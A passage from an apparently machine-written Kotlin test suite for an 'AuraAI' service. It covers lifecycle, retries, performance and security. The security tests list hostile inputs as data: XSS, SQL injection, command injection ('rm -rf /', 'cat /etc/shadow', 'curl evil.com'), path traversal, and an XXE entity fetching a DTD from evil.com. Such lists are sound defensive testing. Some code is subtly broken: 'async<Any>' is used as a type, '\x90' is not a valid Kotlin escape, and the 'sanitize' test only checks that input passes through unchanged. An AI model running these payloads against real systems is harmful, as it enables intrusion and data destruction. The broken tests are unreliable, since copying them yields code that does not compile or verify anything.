        @DisplayName("Should handle repeated shutdown calls gracefully")
        fun `should handle repeated shutdown calls gracefully`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            // When
            auraAIService.shutdown()
            auraAIService.shutdown() // Second call
            auraAIService.shutdown() // Third call

            // Then
            assertFalse(auraAIService.isInitialized())
            verify(atMost = 1) { mockLogger.info("AuraAI service shutting down") }
        }

        @Test
        @DisplayName("Should handle service status during initialization")
        fun `should handle service status during initialization`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config

            // When
            val statusBefore = auraAIService.getServiceStatus()
            auraAIService.initialize()
            val statusAfter = auraAIService.getServiceStatus()

            // Then
            assertFalse(statusBefore.isInitialized)
            assertTrue(statusAfter.isInitialized)
        }

        @Test
        @DisplayName("Should handle health check timeout")
        fun `should handle health check timeout`() = runTest {
            // Given
            coEvery { mockApiClient.healthCheck() } coAnswers {
                delay(5000) // Long delay to simulate timeout
                true
            }

            // When & Then
            assertThrows<TimeoutCancellationException> {
                withTimeout(100) {
                    auraAIService.performHealthCheck()
                }
            }
        }

        @Test
        @DisplayName("Should handle concurrent health checks")
        fun `should handle concurrent health checks`() = runTest {
            // Given
            coEvery { mockApiClient.healthCheck() } returns true

            // When
            val results = (1..10).map {
                async {
                    auraAIService.performHealthCheck()
                }
            }.map { it.await() }

            // Then
            assertTrue(results.all { it })
        }

        @Test
        @DisplayName("Should handle service state transitions")
        fun `should handle service state transitions`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config

            // Test uninitialized -> initialized
            assertFalse(auraAIService.isInitialized())
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())

            // Test initialized -> shutdown
            auraAIService.shutdown()
            assertFalse(auraAIService.isInitialized())

            // Test shutdown -> initialized again
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle service status with circuit breaker")
        fun `should handle service status with circuit breaker`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()
            
            // Simulate multiple failures to trigger circuit breaker
            coEvery { mockApiClient.healthCheck() } throws IOException("Service unavailable")
            repeat(5) {
                try {
                    auraAIService.performHealthCheck()
                } catch (e: Exception) {
                    // Expected to fail
                }
            }

            // When
            val status = auraAIService.getServiceStatus()

            // Then
            // Circuit breaker behavior would be implementation-specific
            assertNotNull(status.lastHealthCheck)
        }

        @Test
        @DisplayName("Should handle rapid service state changes")
        fun `should handle rapid service state changes`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config

            // When
            repeat(100) {
                auraAIService.initialize()
                assertTrue(auraAIService.isInitialized())
                auraAIService.shutdown()
                assertFalse(auraAIService.isInitialized())
            }

            // Then
            // Final state should be shutdown
            assertFalse(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle service shutdown during active operations")
        fun `should handle service shutdown during active operations`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val response = AIResponse("Test response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } coAnswers {
                delay(1000) // Simulate long operation
                response
            }

            // When
            val queryJob = async {
                auraAIService.processQuery("Test query")
            }
            
            delay(100) // Let query start
            auraAIService.shutdown()

            // Then
            assertFalse(auraAIService.isInitialized())
            // Query should fail due to shutdown
            assertThrows<ServiceException> {
                queryJob.await()
            }
        }
    }

    @Nested
    @DisplayName("Error Handling and Recovery Tests")
    inner class ErrorHandlingTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should handle authentication errors")
        fun `should handle authentication errors`() = runTest {
            // Given
            val query = "Test query"
            coEvery { mockApiClient.sendQuery(any()) } throws AuthenticationException("Invalid API key")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should handle quota exceeded errors")
        fun `should handle quota exceeded errors`() = runTest {
            // Given
            val query = "Test query"
            coEvery { mockApiClient.sendQuery(any()) } throws QuotaExceededException("API quota exceeded")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should recover from temporary network failures")
        fun `should recover from temporary network failures`() = runTest {
            // Given
            val query = "Test query"
            val expectedResponse = AIResponse("Success after retry", 0.8, 15)
            
            coEvery { mockApiClient.sendQuery(any()) } throws 
                IOException("Network error") andThen 
                IOException("Network error") andThen 
                expectedResponse

            // When
            val result = auraAIService.processQuery(query)

            // Then
            assertEquals(expectedResponse, result)
            coVerify(exactly = 3) { mockApiClient.sendQuery(query) }
        }

        @Test
        @DisplayName("Should handle malformed responses")
        fun `should handle malformed responses`() = runTest {
            // Given
            val query = "Test query"
            coEvery { mockApiClient.sendQuery(any()) } throws JsonParseException("Malformed JSON response")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should handle out of memory errors gracefully")
        fun `should handle out of memory errors gracefully`() = runTest {
            // Given
            val query = "Memory intensive query"
            coEvery { mockApiClient.sendQuery(any()) } throws OutOfMemoryError("Java heap space")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should implement circuit breaker pattern")
        fun `should implement circuit breaker pattern`() = runTest {
            // Given
            val query = "Test query"
            repeat(5) {
                coEvery { mockApiClient.sendQuery(any()) } throws IOException("Network error")
                assertThrows<ServiceException> {
                    auraAIService.processQuery(query)
                }
            }

            // When
            val status = auraAIService.getServiceStatus()

            // Then
            assertTrue(status.isCircuitBreakerOpen)
        }

        @Test
        @DisplayName("Should handle cascading failures")
        fun `should handle cascading failures`() = runTest {
            // Given
            val query = "Test query"
            val exceptions = listOf(
                IOException("Network error"),
                TimeoutException("Request timeout"),
                AuthenticationException("Auth failed"),
                QuotaExceededException("Quota exceeded")
            )

            exceptions.forEach { exception ->
                // Given
                coEvery { mockApiClient.sendQuery(any()) } throws exception

                // When & Then
                assertThrows<ServiceException> {
                    auraAIService.processQuery(query)
                }
            }
        }

        @Test
        @DisplayName("Should handle error recovery with exponential backoff")
        fun `should handle error recovery with exponential backoff`() = runTest {
            // Given
            val query = "Test query"
            val response = AIResponse("Success after backoff", 0.8, 10)
            val failureCount = AtomicInteger(0)
            
            coEvery { mockApiClient.sendQuery(any()) } coAnswers {
                val count = failureCount.incrementAndGet()
                if (count <= 3) {
                    throw IOException("Network error $count")
                }
                response
            }

            // When
            val result = auraAIService.processQuery(query)

            // Then
            assertEquals(response, result)
            assertTrue(failureCount.get() >= 3)
        }

        @Test
        @DisplayName("Should handle concurrent error scenarios")
        fun `should handle concurrent error scenarios`() = runTest {
            // Given
            val queries = (1..10).map { "Query $it" }
            val exceptions = listOf(
                IOException("Network error"),
                TimeoutException("Timeout"),
                AuthenticationException("Auth error")
            )

            queries.forEachIndexed { index, query ->
                val exception = exceptions[index % exceptions.size]
                coEvery { mockApiClient.sendQuery(query) } throws exception
            }

            // When
            val results = queries.map { query ->
                async {
                    try {
                        auraAIService.processQuery(query)
                        null
                    } catch (e: ServiceException) {
                        e
                    }
                }
            }.map { it.await() }

            // Then
            assertTrue(results.all { it is ServiceException })
        }

        @Test
        @DisplayName("Should handle partial system failures")
        fun `should handle partial system failures`() = runTest {
            // Given
            val queries = listOf("Success query", "Fail query", "Success query 2")
            val successResponse = AIResponse("Success", 0.8, 10)
            
            coEvery { mockApiClient.sendQuery("Success query") } returns successResponse
            coEvery { mockApiClient.sendQuery("Fail query") } throws IOException("Network error")
            coEvery { mockApiClient.sendQuery("Success query 2") } returns successResponse

            // When
            val results = queries.map { query ->
                async {
                    try {
                        auraAIService.processQuery(query)
                    } catch (e: ServiceException) {
                        null
                    }
                }
            }.map { it.await() }

            // Then
            assertEquals(3, results.size)
            assertEquals(successResponse, results[0])
            assertNull(results[1])
            assertEquals(successResponse, results[2])
        }

        @Test
        @DisplayName("Should handle error propagation in context operations")
        fun `should handle error propagation in context operations`() = runTest {
            // Given
            val sessionId = "error-session"
            val query = "Test query"
            
            coEvery { mockApiClient.sendQueryWithContext(any(), any()) } throws IOException("Context error")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQueryWithContext(query, sessionId)
            }
        }

        @Test
        @DisplayName("Should handle resource cleanup on errors")
        fun `should handle resource cleanup on errors`() = runTest {
            // Given
            val sessionId = "cleanup-session"
            auraAIService.storeContext(sessionId, "Initial context")
            
            coEvery { mockApiClient.sendQuery(any()) } throws OutOfMemoryError("Memory exhausted")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery("Test query")
            }

            // Context should still be preserved despite error
            val context = auraAIService.getContext(sessionId)
            assertEquals(1, context.size)
        }

        @Test
        @DisplayName("Should handle thread interruption gracefully")
        fun `should handle thread interruption gracefully`() = runTest {
            // Given
            val query = "Interruptible query"
            coEvery { mockApiClient.sendQuery(any()) } coAnswers {
                delay(1000)
                AIResponse("Should not reach", 0.8, 10)
            }

            // When & Then
            assertThrows<CancellationException> {
                supervisorScope {
                    val job = launch {
                        auraAIService.processQuery(query)
                    }
                    delay(100)
                    job.cancel()
                    job.join()
                }
            }
        }

        @Test
        @DisplayName("Should handle error logging with sensitive data filtering")
        fun `should handle error logging with sensitive data filtering`() = runTest {
            // Given
            val sensitiveQuery = "Query with API key: secret-key-12345"
            coEvery { mockApiClient.sendQuery(any()) } throws IOException("Network error")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(sensitiveQuery)
            }

            // Verify sensitive data is not logged
            verify { mockLogger.error(match { !it.contains("secret-key-12345") }) }
        }
    }

    @Nested
    @DisplayName("Performance and Resource Management Tests")
    inner class PerformanceTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should handle concurrent requests efficiently")
        fun `should handle concurrent requests efficiently`() = runTest {
            // Given
            val queries = (1..10).map { "Query $it" }
            val responses = queries.map { AIResponse("Response for $it", 0.8, 10) }
            
            queries.zip(responses).forEach { (query, response) ->
                coEvery { mockApiClient.sendQuery(query) } returns response
            }

            // When
            val results = queries.map { query ->
                auraAIService.processQuery(query)
            }

            // Then
            assertEquals(10, results.size)
            results.zip(responses).forEach { (result, expected) ->
                assertEquals(expected, result)
            }
        }

        @Test
        @DisplayName("Should manage memory efficiently with large contexts")
        fun `should manage memory efficiently with large contexts`() = runTest {
            // Given
            val sessionId = "large-context-session"
            val largeContext = (1..1000).map { "Context item $it" }.joinToString(" ")
            
            // When
            auraAIService.storeContext(sessionId, largeContext)
            val retrievedContext = auraAIService.getContext(sessionId)

            // Then
            assertEquals(largeContext, retrievedContext.joinToString(" "))
        }

        @Test
        @DisplayName("Should implement proper timeout handling")
        fun `should implement proper timeout handling`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test-key", "baseUrl" to "https://test.com", "timeout" to "1000")
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()
            
            coEvery { mockApiClient.sendQuery(any()) } throws TimeoutException("Request timeout")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery("Test query")
            }
        }

        @Test
        @DisplayName("Should handle high-frequency requests with rate limiting")
        fun `should handle high-frequency requests with rate limiting`() = runTest {
            // Given
            val numberOfRequests = 100
            val queries = (1..numberOfRequests).map { "Rapid query $it" }
            val response = AIResponse("Rate limited response", 0.8, 5)
            
            queries.forEach { query ->
                coEvery { mockApiClient.sendQuery(query) } returns response
            }

            // When
            val startTime = System.currentTimeMillis()
            val results = queries.map { auraAIService.processQuery(it) }
            val endTime = System.currentTimeMillis()

            // Then
            assertEquals(numberOfRequests, results.size)
            val totalTime = endTime - startTime
            assertTrue(totalTime > 0) // Should take some time due to rate limiting
        }

        @Test
        @DisplayName("Should clean up resources properly on shutdown")
        fun `should clean up resources properly on shutdown`() = runTest {
            // Given
            val sessionIds = (1..10).map { "session-$it" }
            sessionIds.forEach { sessionId ->
                auraAIService.storeContext(sessionId, "Context for $sessionId")
            }

            // When
            auraAIService.shutdown()

            // Then
            assertFalse(auraAIService.isInitialized())
            sessionIds.forEach { sessionId ->
                assertTrue(auraAIService.getContext(sessionId).isEmpty())
            }
        }

        @Test
        @DisplayName("Should handle memory-intensive operations")
        fun `should handle memory-intensive operations`() = runTest {
            // Given
            val largeQuery = "Large query ".repeat(100000)
            val response = AIResponse("Large response", 0.8, 50000)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            val result = auraAIService.processQuery(largeQuery)

            // Then
            assertEquals(response, result)
        }

        @Test
        @DisplayName("Should handle performance degradation gracefully")
        fun `should handle performance degradation gracefully`() = runTest {
            // Given
            val queries = (1..50).map { "Performance query $it" }
            val responses = queries.map { AIResponse("Response for $it", 0.8, 10) }
            val delays = (1..50).map { it * 10L } // Increasing delays

            queries.zip(responses).zip(delays).forEach { (queryResponse, delay) ->
                val (query, response) = queryResponse
                coEvery { mockApiClient.sendQuery(query) } coAnswers {
                    delay(delay)
                    response
                }
            }

            // When
            val results = queries.map { query ->
                async {
                    auraAIService.processQuery(query)
                }
            }.map { it.await() }

            // Then
            assertEquals(50, results.size)
            results.zip(responses).forEach { (result, expected) ->
                assertEquals(expected, result)
            }
        }

        @Test
        @DisplayName("Should handle resource starvation scenarios")
        fun `should handle resource starvation scenarios`() = runTest {
            // Given
            val sessions = (1..100).map { "session-$it" }
            val contextSize = 100
            
            // When
            sessions.forEach { sessionId ->
                repeat(contextSize) { contextIndex ->
                    auraAIService.storeContext(sessionId, "Context $contextIndex for $sessionId")
                }
            }

            // Then
            sessions.forEach { sessionId ->
                val context = auraAIService.getContext(sessionId)
                assertTrue(context.size <= contextSize)
            }
        }

        @Test
        @DisplayName("Should handle burst traffic efficiently")
        fun `should handle burst traffic efficiently`() = runTest {
            // Given
            val burstSize = 200
            val queries = (1..burstSize).map { "Burst query $it" }
            val response = AIResponse("Burst response", 0.8, 5)
            
            queries.forEach { query ->
                coEvery { mockApiClient.sendQuery(query) } returns response
            }

            // When
            val startTime = System.currentTimeMillis()
            val results = queries.map { query ->
                async {
                    auraAIService.processQuery(query)
                }
            }.map { it.await() }
            val endTime = System.currentTimeMillis()

            // Then
            assertEquals(burstSize, results.size)
            val avgTimePerRequest = (endTime - startTime) / burstSize.toDouble()
            assertTrue(avgTimePerRequest < 1000) // Should be reasonably fast
        }

        @Test
        @DisplayName("Should handle gradual performance degradation")
        fun `should handle gradual performance degradation`() = runTest {
            // Given
            val queries = (1..20).map { "Degradation query $it" }
            val response = AIResponse("Degradation response", 0.8, 10)
            val processingTimes = mutableListOf<Long>()

            queries.forEachIndexed { index, query ->
                coEvery { mockApiClient.sendQuery(query) } coAnswers {
                    delay(index * 50L) // Gradually increasing delay
                    response
                }
            }

            // When
            queries.forEach { query ->
                val startTime = System.currentTimeMillis()
                auraAIService.processQuery(query)
                val endTime = System.currentTimeMillis()
                processingTimes.add(endTime - startTime)
            }

            // Then
            // Processing times should generally increase
            assertTrue(processingTimes.last() > processingTimes.first())
        }

        @Test
        @DisplayName("Should handle context expiration efficiently")
        fun `should handle context expiration efficiently`() = runTest {
            // Given
            val sessionIds = (1..50).map { "expiring-session-$it" }
            
            sessionIds.forEach { sessionId ->
                repeat(20) { contextIndex ->
                    auraAIService.storeContext(sessionId, "Context $contextIndex")
                }
            }

            // When
            auraAIService.expireOldContexts()

            // Then
            sessionIds.forEach { sessionId ->
                val context = auraAIService.getContext(sessionId)
                assertTrue(context.isEmpty())
            }
        }

        @Test
        @DisplayName("Should handle mixed workload scenarios")
        fun `should handle mixed workload scenarios`() = runTest {
            // Given
            val fastQueries = (1..30).map { "Fast query $it" }
            val slowQueries = (1..10).map { "Slow query $it" }
            val contextQueries = (1..20).map { "Context query $it" }
            
            val fastResponse = AIResponse("Fast response", 0.9, 5)
            val slowResponse = AIResponse("Slow response", 0.8, 50)
            val contextResponse = AIResponse("Context response", 0.8, 15)

            fastQueries.forEach { query ->
                coEvery { mockApiClient.sendQuery(query) } coAnswers {
                    delay(10)
                    fastResponse
                }
            }
            
            slowQueries.forEach { query ->
                coEvery { mockApiClient.sendQuery(query) } coAnswers {
                    delay(200)
                    slowResponse
                }
            }
            
            contextQueries.forEach { query ->
                coEvery { mockApiClient.sendQueryWithContext(query, any()) } coAnswers {
                    delay(50)
                    contextResponse
                }
            }

            // When
            val allJobs = mutableListOf<async<Any>>()
            
            // Add fast queries
            fastQueries.forEach { query ->
                allJobs.add(async { auraAIService.processQuery(query) })
            }
            
            // Add slow queries
            slowQueries.forEach { query ->
                allJobs.add(async { auraAIService.processQuery(query) })
            }
            
            // Add context queries
            contextQueries.forEach { query ->
                allJobs.add(async { auraAIService.processQueryWithContext(query, "mixed-session") })
            }

            val results = allJobs.map { it.await() }

            // Then
            assertEquals(60, results.size)
        }
    }

    @Nested
    @DisplayName("Security and Input Validation Tests")
    inner class SecurityTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should sanitize potentially dangerous input")
        fun `should sanitize potentially dangerous input`() = runTest {
            // Given
            val dangerousInputs = listOf(
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "\u0000null\u0000bytes",
                "payload\r\nHost: evil.com"
            )
            val response = AIResponse("Sanitized response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            dangerousInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
                coVerify { mockApiClient.sendQuery(input) }
            }
        }

        @Test
        @DisplayName("Should validate API key strength")
        fun `should validate API key strength`() {
            // Given
            val weakApiKeys = listOf(
                "", "   ", "weak", "12345", "password", "api-key"
            )

            weakApiKeys.forEach { weakKey ->
                // Given
                val config = mapOf(
                    "apiKey" to weakKey,
                    "baseUrl" to "https://api.test.com",
                    "timeout" to "30000"
                )
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Weak API key '$weakKey' should be rejected")
            }
        }

        @Test
        @DisplayName("Should validate session ID format for security")
        fun `should validate session ID format for security`() = runTest {
            // Given
            val maliciousSessionIds = listOf(
                "../../../config",
                "session<script>",
                "session'; DROP TABLE sessions; --",
                "session\u0000hidden",
                "session\r\nHost: evil.com"
            )

            maliciousSessionIds.forEach { sessionId ->
                // When & Then
                assertThrows<IllegalArgumentException> {
                    auraAIService.storeContext(sessionId, "Test context")
                }
            }
        }

        @Test
        @DisplayName("Should handle URL validation for base URL")
        fun `should handle URL validation for base URL`() {
            // Given
            val maliciousUrls = listOf(
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
                "file:///etc/passwd",
                "ftp://malicious.com",
                "http://localhost:22",
                "https://127.0.0.1:8080"
            )

            maliciousUrls.forEach { url ->
                // Given
                val config = mapOf(
                    "apiKey" to "test-key-12345",
                    "baseUrl" to url,
                    "timeout" to "30000"
                )
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Malicious URL '$url' should be rejected")
            }
        }

        @Test
        @DisplayName("Should handle input with directory traversal attempts")
        fun `should handle input with directory traversal attempts`() = runTest {
            // Given
            val traversalInputs = listOf(
                "Query with ../../../etc/passwd",
                "Query with ..\\..\\..\\windows\\system32\\config\\sam",
                "Query with %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "Query with ....//....//....//etc/passwd"
            )
            val response = AIResponse("Traversal response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            traversalInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle SQL injection attempts in queries")
        fun `should handle SQL injection attempts in queries`() = runTest {
            // Given
            val sqlInjectionInputs = listOf(
                "Query'; DROP TABLE users; --",
                "Query' OR '1'='1",
                "Query'; INSERT INTO users VALUES ('hacker', 'pass'); --",
                "Query' UNION SELECT * FROM sensitive_data --",
                "Query'; EXEC xp_cmdshell('format c:'); --"
            )
            val response = AIResponse("SQL injection response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            sqlInjectionInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle command injection attempts")
        fun `should handle command injection attempts`() = runTest {
            // Given
            val commandInjectionInputs = listOf(
                "Query; rm -rf /",
                "Query | cat /etc/passwd",
                "Query && curl evil.com",
                "Query; powershell -c \"Get-Content C:\\secrets.txt\"",
                "Query `cat /etc/shadow`"
            )
            val response = AIResponse("Command injection response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            commandInjectionInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle LDAP injection attempts")
        fun `should handle LDAP injection attempts`() = runTest {
            // Given
            val ldapInjectionInputs = listOf(
                "Query)(uid=*)(&(password=*)",
                "Query)(|(uid=*)(password=*))",
                "Query*)(uid=admin)(password=password",
                "Query)(cn=*))(&(objectClass=*"
            )
            val response = AIResponse("LDAP injection response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            ldapInjectionInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle buffer overflow attempts")
        fun `should handle buffer overflow attempts`() = runTest {
            // Given
            val bufferOverflowInputs = listOf(
                "A".repeat(10000),
                "A".repeat(65536),
                "A".repeat(1000000),
                "%s".repeat(1000),
                "\x90".repeat(1000) + "shellcode"
            )
            val response = AIResponse("Buffer overflow response", 0.8, 100)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            bufferOverflowInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle format string attacks")
        fun `should handle format string attacks`() = runTest {
            // Given
            val formatStringInputs = listOf(
                "Query %s%s%s%s%s",
                "Query %n%n%n%n%n",
                "Query %x%x%x%x%x",
                "Query %d%d%d%d%d",
                "Query %08x%08x%08x%08x"
            )
            val response = AIResponse("Format string response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            formatStringInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle XML external entity attacks")
        fun `should handle XML external entity attacks`() = runTest {
            // Given
            val xxeInputs = listOf(
                "Query <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "Query <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>",
                "Query <query>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</query>"
            )
            val response = AIResponse("XXE response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            xxeInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle regex denial of service attacks")
        fun `should handle regex denial of service attacks`() = runTest {
            // Given
            val regexDosInputs = listOf(
                "Query (a+)+$",
                "Query (a|a)*",
                "Query ([a-zA-Z]+)*",
                "Query (a|b)*aaac",
                "Query ^(a+)+$"
            )
            val response = AIResponse("Regex DOS response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            regexDosInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle prototype pollution attempts")
        fun `should handle prototype pollution attempts`() = runTest {
            // Given
            val prototypePollutionInputs = listOf(
                "Query {\"__proto__\": {\"polluted\": true}}",
                "Query constructor.prototype.polluted = true",
                "Query Object.prototype.toString = function() { return 'pwned'; }",
                "Query {\"constructor\": {\"prototype\": {\"polluted\": true}}}"
            )
            val response = AIResponse("Prototype pollution response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            prototypePollutionInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle cross-site scripting prevention")
        fun `should handle cross-site scripting prevention`() = runTest {
            // Given
            val xssInputs = listOf(
                "Query <script>alert('XSS')</script>",
                "Query <img src=x onerror=alert('XSS')>",
                "Query <svg onload=alert('XSS')>",
                "Query javascript:alert('XSS')",
                "Query <iframe src=javascript:alert('XSS')></iframe>"
            )
            val response = AIResponse("XSS response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            xssInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle template injection attempts")
        fun `should handle template injection attempts`() = runTest {
            // Given
            val templateInjectionInputs = listOf(
                "Query {{7*7}}",
                "Query \${7*7}",
                "Query #{7*7}",
                "Query <%=7*7%>",
                "Query {{constructor.constructor('alert(1)')()}}"
            )
            val response = AIResponse("Template injection response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            templateInjectionInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle deserialization attacks")
        fun `should handle deserialization attacks`() = runTest {
            // Given
            val deserializationInputs = listOf(
                "Query rO0ABXNyABJqYXZhLmxhbmcuUnVudGltZQ==",
                "Query H4sIAAAAAAAAAJ2RQQ6CQAyF7/LeAAj6Cw==",
                "Query AC ED 00 05 73 72 00 0A SerialKiller"
            )
            val response = AIResponse("Deserialization response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            deserializationInputs.forEach { input ->
                // When
                val result = auraAIService.processQuery(input)

                // Then
                assertEquals(response, result)
            }
        }
    }

    @Nested
    @DisplayName("Integration and Boundary Tests")
    inner class IntegrationTests {

        @Test
        @DisplayName("Should handle service lifecycle transitions")
        fun `should handle service lifecycle transitions`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config

            // When & Then - Initialize
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())

            // When & Then - Use service
            val query = "Test query"
            val response = AIResponse("Test response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response
            val result = auraAIService.processQuery(query)
            assertEquals(response, result)

            // When & Then - Shutdown
            auraAIService.shutdown()
            assertFalse(auraAIService.isInitialized())

            // When & Then - Reinitialize
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle boundary token limits")
        fun `should handle boundary token limits`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val boundaryTokenCounts = listOf(0, 1, 4095, 4096, 4097, Int.MAX_VALUE)
            
            boundaryTokenCounts.forEach { tokenCount ->
                // Given
                val query = "Boundary test query"
                val response = AIResponse("Boundary response", 0.8, tokenCount)
                coEvery { mockApiClient.sendQuery(any()) } returns response

                // When
                if (tokenCount < 0) {
                    assertThrows<ServiceException> {
                        auraAIService.processQuery(query)
                    }
                } else {
                    val result = auraAIService.processQuery(query)
                    assertEquals(tokenCount, result.tokensUsed)
                }
            }
        }

        @Test
        @DisplayName("Should handle confidence boundary values")
        fun `should handle confidence boundary values`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val boundaryConfidences = listOf(-0.1, 0.0, 0.5, 1.0, 1.1)
            
            boundaryConfidences.forEach { confidence ->
                // Given
                val query = "Confidence test query"
                val response = AIResponse("Confidence response", confidence, 10)
                coEvery { mockApiClient.sendQuery(any()) } returns response

                // When & Then
                if (confidence < 0.0 || confidence > 1.0) {
                    assertThrows<ServiceException> {
                        auraAIService.processQuery(query)
                    }
                } else {
                    val result = auraAIService.processQuery(query)
                    assertEquals(confidence, result.confidence, 0.001)
                }
            }
        }

        @Test
        @DisplayName("Should handle complex integration scenarios")
        fun `should handle complex integration scenarios`() = runTest {
            // Given
